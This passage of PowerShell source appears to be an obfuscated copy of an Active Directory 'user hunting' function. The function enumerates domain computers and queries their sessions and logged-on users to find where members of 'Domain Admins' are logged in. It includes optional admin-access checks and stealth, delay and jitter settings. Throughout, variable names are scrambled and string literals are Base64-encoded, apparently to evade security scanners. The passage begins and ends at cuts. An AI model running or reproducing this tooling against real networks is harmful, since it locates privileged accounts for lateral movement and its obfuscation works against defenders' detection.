        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,
        [Switch]
        $Stealth,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/\_/==\__/=\/\} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${_/\_____/====\/===} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${_/=\_____/===\/\/=} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${___/\/\/\__/==\/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=\___/=\/=\/==\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))] = $UserAllowDelegation }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/=\__/=\___/=\/=} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/=\__/=\___/=\/=} = @(${____/=\/=\_/=\/\/})
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFMAdABlAGEAbAB0AGgAIABlAG4AdQBtAGUAcgBhAHQAaQBvAG4AIAB1AHMAaQBuAGcAIABzAG8AdQByAGMAZQA6ACAAJABTAHQAZQBhAGwAdABoAFMAbwB1AHIAYwBlAA==')))
                ${_/\___/=\/=\_/\/\} = New-Object System.Collections.ArrayList
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQB8AEEAbABsAA==')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZgBpAGwAZQAgAHMAZQByAHYAZQByAHMA')))
                    ${_/\/\/\_/\_/====\} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\_/\_/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${_/\___/==\_/=\/\_} = _/==\/=\/==\/\___/ @_/\/\/\_/\_/====\
                    if (${_/\___/==\_/=\/\_} -isnot [System.Array]) { ${_/\___/==\_/=\/\_} = @(${_/\___/==\_/=\/\_}) }
                    ${_/\___/=\/=\_/\/\}.AddRange( ${_/\___/==\_/=\/\_} )
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMAfABBAGwAbAA=')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAARABGAFMAIABzAGUAcgB2AGUAcgBzAA==')))
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAHwAQQBsAGwA')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMA')))
                    ${/==\_/=\/==\____/} = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\_/=\/==\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${/==\_/=\/==\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\_/=\/==\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\_/=\/==\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${/=\/\/\__/=\__/\/} = _/=\/\/=\/\__/\/\/ @/==\_/=\/==\____/ | select -ExpandProperty dnshostname
                    if (${/=\/\/\__/=\__/\/} -isnot [System.Array]) { ${/=\/\/\__/=\__/\/} = @(${/=\/\/\__/=\__/\/}) }
                    ${_/\___/=\/=\_/\/\}.AddRange( ${/=\/\/\__/=\__/\/} )
                }
                ${_/=\__/=\___/=\/=} = ${_/\___/=\/=\_/\/\}.ToArray()
            }
            else {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAYQBsAGwAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
                ${_/=\__/=\___/=\/=} = _/==\/\/\_______/\ @_/\/\_/==\__/=\/\ | select -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
        if (${_/=\__/=\___/=\/=}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${_____/==\/\___/=\} = $Credential.GetNetworkCredential().UserName
        }
        else {
            ${_____/==\/\___/=\} = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA=')))]) {
            ${__/\/=\/=\/==\/==} = @()
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${__/\/=\/=\/==\/==} = __/\__/\/======\_/ @/=\___/=\/=\/==\/ | select -ExpandProperty samaccountname
        }
        else {
            ${/==\__/==========} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${__/\/=\/=\/==\/==} = _/=\/\/=====\/\/== @/==\__/========== | select -ExpandProperty MemberName
        }
        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $(${__/\/=\/=\/==\/==}.Length)"
        if ((-not $ShowAll) -and (${__/\/=\/=\/==\/==}.Length -eq 0)) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAHUAcwBlAHIAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAHQAYQByAGcAZQB0AA==')))
        }
        ${____/=\/\_/\/\/\_} = {
            Param(${____/=\/=\_/=\/\/}, ${__/\/=\/=\/==\/==}, ${_____/==\/\___/=\}, $Stealth, ${_/=\/=\_/=\/=\/\/=})
            if (${_/=\/=\_/=\/=\/\/=}) {
                $Null = _/=\/=\/==\_/=\__/ -_/=\/=\_/=\/=\/\/= ${_/=\/=\_/=\/=\/\/=} -___/==\_/\/=\_/=\_
            }
            ForEach (${__/==\_/=\/===\/=} in ${____/=\/=\_/=\/\/}) {
                ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName ${__/==\_/=\/===\/=}
                if (${__/==\/=\/\/\/=\/}) {
                    ${_/=\/\_/=\__/=\/\} = _/===\/==\/\/===\_ -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=}
                    ForEach (${_/\/\___/\_/\__/=} in ${_/=\/\_/=\__/=\/\}) {
                        ${/=\/=\_/\_/\/\_/\} = ${_/\/\___/\_/\__/=}.UserName
                        ${__/=\/=\___/\/=\_} = ${_/\/\___/\_/\__/=}.CName
                        if (${__/=\/=\___/\/=\_} -and ${__/=\/=\___/\/=\_}.StartsWith('\\')) {
                            ${__/=\/=\___/\/=\_} = ${__/=\/=\___/\/=\_}.TrimStart('\')
                        }
                        if ((${/=\/=\_/\_/\/\_/\}) -and (${/=\/=\_/\_/\/\_/\}.Trim() -ne '') -and (${/=\/=\_/\_/\/\_/\} -notmatch ${_____/==\/\___/=\}) -and (${/=\/=\_/\_/\/\_/\} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                            if ( (-not ${__/\/=\/=\/==\/==}) -or (${__/\/=\/=\/==\/==} -contains ${/=\/=\_/\_/\/\_/\})) {
                                ${/\_____/\_/\/\__/} = New-Object PSObject
                                ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $Null
                                ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\/=\_/\_/\/\_/\}
                                ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/==\_/=\/===\/=}
                                ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) ${__/=\/=\___/\/=\_}
                                try {
                                    ${/=\_/\_/=\_/==\/=} = [System.Net.Dns]::GetHostEntry(${__/=\/=\___/\/=\_}) | select -ExpandProperty HostName
                                    ${/\_____/\_/\/\__/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) ${/=\_/\_/=\_/==\/=}
                                }
                                catch {
                                    ${/\_____/\_/\/\__/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                }
                                if ($CheckAccess) {
                                    ${_/\/===\___/\____} = (_/=\/\_/\_/=====\_ -____/=\/=\_/=\/\/ ${__/=\/=\___/\/=\_}).IsAdmin
                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${_/\/===\___/\____}.IsAdmin
                                }
                                else {
                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                }
                                ${/\_____/\_/\/\__/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                ${/\_____/\_/\/\__/}
                            }
                        }
                    }
                    if (-not $Stealth) {
                        ${_/\/\_____/=\_/\_} = __/\/=\_/\/=\/==== -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=}
                        ForEach (${__/====\_/==\_/=\/} in ${_/\/\_____/=\_/\_}) {
                            ${/=\/=\_/\_/\/\_/\} = ${__/====\_/==\_/=\/}.UserName
                            $UserDomain = ${__/====\_/==\_/=\/}.LogonDomain
                            if ((${/=\/=\_/\_/\/\_/\}) -and (${/=\/=\_/\_/\/\_/\}.trim() -ne '')) {
                                if ( (-not ${__/\/=\/=\/==\/==}) -or (${__/\/=\/=\/==\/==} -contains ${/=\/=\_/\_/\/\_/\}) -and (${/=\/=\_/\_/\/\_/\} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                                    ${_/===\_/\___/=\/=} = @(_____/=\_/\/==\/\_ -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=})[0].IPAddress
                                    ${/\_____/\_/\/\__/} = New-Object PSObject
